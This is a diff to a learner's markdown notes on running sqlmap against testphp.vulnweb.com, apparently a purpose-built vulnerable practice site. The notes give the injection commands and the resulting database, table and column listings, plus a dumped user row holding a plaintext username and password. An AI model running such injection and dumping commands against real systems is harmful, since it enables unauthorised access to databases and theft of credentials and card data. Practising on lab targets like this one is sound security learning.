@@ -169,14 +169,14 @@ i testing the vulnweb.php website
 
 first i used tool is sql map
 
-
+1.
 sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs
 
 ![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
 1.we find data retrive from a database
 [*] acuart
 [*] information_schema
-
+2.
 ![Screenshot_2024-12-10_15_22_49](https://github.com/user-attachments/assets/2f2f9ea3-2964-4b72-bc21-6fb2c9c5e2e6)
 Database: acuart
 [8 tables]
@@ -191,10 +191,37 @@ Database: acuart
 | users     |
 +-----------+
 
-
+3.
 ![Screenshot_2024-12-10_15_32_48](https://github.com/user-attachments/assets/91e8900b-5610-4612-a1b9-49e7e4fa39bf)
 
 
 
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| name    | varchar(100) |
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
 
+4.
 sqlmap http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users -columns
+
+
+
+Database: acuart
+Table: users
+[1 entry]
++-------+--------+------+----------+
+| uname | name   | pass | address  |
++-------+--------+------+----------+
+| test  | 1      | test | Me cawen |
++-------+--------+------+----------+
